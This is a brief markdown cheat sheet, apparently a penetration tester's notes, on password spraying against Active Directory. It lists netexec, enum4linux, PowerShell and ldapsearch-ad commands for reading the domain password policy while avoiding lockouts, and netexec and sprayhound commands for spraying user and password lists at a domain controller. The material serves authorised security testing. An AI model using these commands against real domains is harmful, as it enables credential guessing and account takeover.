# Password Spray Attack

## Tools: CrackMapExec/Netexec , sprayhound

## TIP: Get password policy first to prevent account lockouts! Usually, you need creds for this, but before starting the spray you may get the policy)

## Commands:

### Password Policy

 - netexec IP -u 'USER' -p 'PASSWORD' --pass-pol

 - enum4linux -u 'USERNAME' -p 'PASSWORD' -P IP

 - Get-ADDefaultDomainPasswordPolicy

 - Get-ADFineGrainedPasswordPolicy -filter * (Fine Grained Password Policy (FGPP)

 - Get-ADUserResultantPasswordPolicy -Identity USER

 - ldapsearch-ad.py --server 'DC' -d DOMAIN -u USER -p PASS --type pass-pols

### Password Spray

 - netexec smb DC_IP -u USER.TXT -p PASSWORD.TXT --no-bruteforce (Test user=password)

 - netexec smb DC_IP -u USER.TXT -p PASSWORD.TXT (Multiple test)

 - sprayhound -U USERS.TXT -d DOMAIN -dc DC_IP

